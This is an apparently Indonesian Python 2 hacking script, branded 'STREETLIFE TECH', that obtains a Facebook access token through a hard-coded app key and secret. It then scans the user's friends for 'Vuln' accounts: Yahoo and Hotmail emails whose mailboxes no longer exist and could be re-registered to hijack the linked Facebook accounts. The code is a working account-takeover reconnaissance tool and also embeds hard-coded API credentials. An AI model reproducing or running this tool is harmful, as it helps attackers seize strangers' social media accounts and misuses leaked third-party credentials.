######  JANGAN RECODE YA !!!! ####


import json , sys , hashlib , os , time , marshal, getpass, re, mechanize


if sys.platform in ["linux","linux2"]:
	W = "\033[0m"
        G = '\033[32;1m'
        R = '\033[31;1m'
else:
	W = ''
	G = ''
	R = ''

try:
	import requests
except ImportError:
	
	print "Install Dulu Module >> requests <<"
	sys.exit()

reload (sys)
sys . setdefaultencoding ( 'utf8' )

jml = []
jmlgetdata = []
n = []

def baliho():
	try:
		token = open('token/token.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])
		os.system("clear")
		print ">>>>>>>>>>>>>>>> STREETLIFE TECH <<<<<<<<<<<<<<<<<"
		print '>>>>> 1. Login Untuk Dapat Token '
		print '>>>>> 2. Lihat Token Yang Ada'
		print '>>>>> 3. Hapus Token Yang Terhubung'
		print '>>>>> 4. Scan Teman Yang Vuln '
		print '>>>>> 5. Keluar'
		print ''
		print 'Ketik "help" Untuk Memunculkan Ini '
	
		print ' ' 
		print (G +'Gunakan Dengan Bijak')		
		print ' '
		print ' '
		print ('Akun Yang Terhubung' + R + '  [' + W + name + R + ']')
		print ' '

	except (KeyError,IOError):
		os.system("clear")
		print ">>>>>>>>>>>>>>>> STREETLIFE TECH <<<<<<<<<<<<<<<<<"
		print '>>>>> 1. Login Untuk Dapat Token '
		print '>>>>> 2. Lihat Token Yang Ada'
		print '>>>>> 3. Hapus Token Sebelumnya'
		print '>>>>> 4. Scan Teman Yang Vuln '
		print '>>>>> 5. Keluar'
		print ''
		print 'Ketik "help" Untuk Memunculkan Ini '
	
		print ' ' 
		print (G +'Gunakan Dengan Bijak')		
		print ' '

def id():
	print '>> Login Dulu Dong !!!';
	id = raw_input(R + '> ID Facebook : ');
	pwd = getpass.getpass(R + '> Password : ');
	API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';
	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};
	sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)

	data.update({'sig':x.hexdigest()})
        get(data)
		
def get(data):
	print '>> Mendapatkan Token '

	try:
		os.mkdir('token')
	except OSError:
		pass

	b = open('token/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '>> Terdapatkan !!!'
		print '>> Tokenmu berada di token/token.log'
		os.system('python2 cl4.py')
	except KeyError:
		print (R + '>> Tidak Bisa Mendapatkan Token !!!')
		print ''
		os.remove('token/token.log')
		main()
	except requests.exceptions.ConnectionError:
		print (R + '>> Tidak Bisa Mendapatkan Token !!!')
		print (R + '>> Data Lu Habis Mungkin')
		os.remove('token/token.log')
		main()

def main():
  global jancok

  try:
	cek = raw_input(G + '>> ')

	if cek.lower() == '1':
		try:
			open('token/token.log')
			print '>> Sebelumnya Kamu Login Dengan Akun Lain' 
			cek = raw_input('>> Mau Menghapus Token Sebelumnya ? (y/n)')
			if cek.lower() != 'y':
				print 'Membatalkan '
				bot()
		except IOError:
			pass

		print '' + '' + '>> Mendapatkan Akses Token '
		id()
	elif cek.lower() == "2":
		try:
			o = open('token/token.log','r').read()
			print '>> Ini Tokenmu !!!\n\n' + o + '\n'
			main()
		except IOError:
			print (R + '>> Gagal Mendapatkan Data Di token/token.log')
			main()
			
	elif cek.lower() == '3':
		print '>> Anda Harus Login Lagi Untuk Mendapatkan Akses'
		a = raw_input(R + ">> Yakin Untuk Menghapus Token Sebelumnya ? (y/n)")
		if a.lower() == 'y':
			try:
				os.system('rm -rf token/token.log')
				print '>> Berhasil Menghapus Token'
				main()
			except OSError:
				print (R + '>> Gagal Menghapus Token')
				main()
		else:
			print (R + '>> Gagal Menghapus Token')
			main()
	elif cek.lower() == '5':
		print "Subscribe ke Streetlife Tech Ya !!!"
		sys.exit()
	elif cek.lower() == '4':
		mail()
	elif cek.lower() == 'help':
		help()

	if '' in cek.lower() and cek.lower().split('_')[2] == 'jancok':
		jancok = cek.lower().split('_')[1]
		gausahngegasdong()
	else:
		if cek == '':
				main()		
		else:
			print (R +">> Perintah '"+cek+"' Tidak Berkaitan Dengan Argumen Apapun")
			main()
  except KeyboardInterrupt:
	main()
  except IndexError:
	print (R + ">> Perintah '"+cek+"' Tidak Berkaitan Dengan Argumen Apapun")
	main()


def mail():
	print '>> Mendapatkan Akses Token'

	try:
		token = open('token/token.log','r').read()
                print '>> Berhasil Mendapatkan Akses'
	except IOError:
		print (R + '>> Gagal Mendapatkan Akses')
		print (R + ">> Token Tidak Ada Di Folder token, Login Dan Cek Kembali Koneksi Anda")
		main()
	try:
		br = mechanize.Browser()
		br.set_handle_robots(False)
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
                a = json.loads(r.text)

		print (W + 55*"-")
		print (W + "| " + 11*" " + R + "Email" + 14*" " + W + "|" + 9*" " + R + "Vuln" + 8*" " + W + "|")
		print (55*"-")
		for i in a["data"]:
			wrna = (R)
			wrne = ("\033[39m")
			z = json.loads(requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token).text)
			try:
				kunci = re.compile(r'@.*')
				cari = kunci.search(z['email']).group()
				if ("yahoo.com" in cari):
					br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
					br._factory.is_html = True
					br.select_form(nr=0)
					br["username"] = z['email']
					j = br.submit().read()
					Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
					try:
						cd = Zen.search(j).group()
					except:
						vuln = (6*" " + "\033[31mNot Vuln")
						lean = (30 - (len(z['email'])))
						eml = (lean * " ")
						lone = (24 - (len(vuln)))
						namel = (lone * " ")
						print (W + "| " + wrna + z['email'] + eml + W + "| " + wrne + vuln + namel + W + " |")
						continue
					if ('"messages.ERROR_INVALID_USERNAME">' in cd):
						vuln = (8*" " + "\033[32mVuln")
					else:
						vuln = (5*" " + "\033[31mNot Vuln")
						lean = (30 - (len(z['email'])))
						eml = (lean * " ")
						lone = (24 - (len(vuln)))
						namel = (lone * " ")
					print (W + "| " + wrna + z['email'] + eml + W + "| " + wrne + vuln + namel + W + " |")
				elif 'hotmail' in cari:
					url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
					cek = json.loads(requests.get(url).text)
					if cek['smtp_check'] == 0:
						vuln = (8*" " + "\033[32mVuln")
					else:
						vuln = (5*" " + "\033[31mNot Vuln")
					lean = (30 - (len(z['email'])))
					eml = (lean * " ")
					lone = (24 - (len(vuln)))
					namel = (lone * " ")
					print ("\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|")
				else:
					continue
			except KeyError:
				continue
	except KeyboardInterrupt:
		print '>> Dihentikan'
		main()
	except KeyError:
		print (R + ">> Gagal, Cek Token Anda")
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print (R + '>> Koneksi Error')
		print '>> Dihentikan'
		main()

def help():

	print ">>>>>>>>>>>>>>>> STREETLIFE TECH <<<<<<<<<<<<<<<<<"
	print '>>>>> 1. Login Untuk Dapat Token '
	print '>>>>> 2. Lihat Token Yang Ada'
	print '>>>>> 3. Hapus Token Sebelumnya'
	print '>>>>> 4. Scan Teman Yang Vuln '
	print '>>>>> 5. Keluar'
	print ''
	print 'Ketik "help" Untuk Memunculkan Ini '
	
	print ' ' 
	print (G +'Gunakan Dengan Bijak')		
	print ' '
	main()

if __name__ == '__main__':

	baliho()
	main()	

